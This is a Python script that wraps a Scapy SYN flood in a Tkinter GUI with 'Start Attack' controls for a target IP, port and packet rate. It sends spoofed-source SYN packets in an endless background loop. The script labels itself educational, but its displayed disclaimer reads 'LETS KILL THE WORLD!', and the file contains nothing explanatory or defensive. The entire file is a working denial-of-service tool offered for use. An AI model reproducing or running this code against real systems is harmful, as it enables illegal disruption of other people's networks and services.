import tkinter as tk
from scapy.all import *
import threading
import random
import time

# Educational disclaimer message
DISCLAIMER = """
LETS KILL  THE WORLD!.
"""

def syn_flood(target_ip, target_port, packet_rate):
    """Performs a SYN flood attack by sending packets at a specified rate."""
    while True:
        # Randomizing source IP and sequence number
        src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))  # Random source IP
        seq_num = random.randint(1000, 9000)  # Random sequence number
        ip = IP(src=src_ip, dst=target_ip)
        syn = TCP(dport=target_port, flags="S", seq=seq_num)
        pkt = ip/syn
        send(pkt, verbose=0)
        
        # Control the attack speed
        time.sleep(1 / packet_rate)

def start_attack():
    """Starts the SYN flood attack in a separate thread."""
    target_ip = ip_entry.get()
    try:
        target_port = int(port_entry.get())
        packet_rate = float(rate_entry.get())
        if packet_rate <= 0:
            raise ValueError("Packet rate must be greater than zero.")

        attack_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, packet_rate))
        attack_thread.daemon = True
        attack_thread.start()
        status_label.config(text=f"Attack started on {target_ip}:{target_port} at {packet_rate} packets/sec")
    except ValueError as e:
        status_label.config(text=f"Error: {e}")

# Set up the GUI window
window = tk.Tk()
window.title("Educational SYN Flood Tool")
window.geometry("450x300")

# Disclaimer section
disclaimer_label = tk.Label(window, text=DISCLAIMER, fg="red", wraplength=400, justify="center")
disclaimer_label.pack(pady=10)

# Add labels and entry fields
ip_label = tk.Label(window, text="TARGET IP:")
ip_label.pack(pady=5)
ip_entry = tk.Entry(window)
ip_entry.pack(pady=5)

port_label = tk.Label(window, text="PORT:")
port_label.pack(pady=5)
port_entry = tk.Entry(window)
port_entry.pack(pady=5)

rate_label = tk.Label(window, text="PACKETS PER SECOND:")
rate_label.pack(pady=5)
rate_entry = tk.Entry(window)
rate_entry.pack(pady=5)

# Start attack button
attack_button = tk.Button(window, text="Start Attack", command=start_attack)
attack_button.pack(pady=20)

# Status label to show the status of the attack
status_label = tk.Label(window, text="")
status_label.pack(pady=10)

# Run the GUI
window.mainloop()
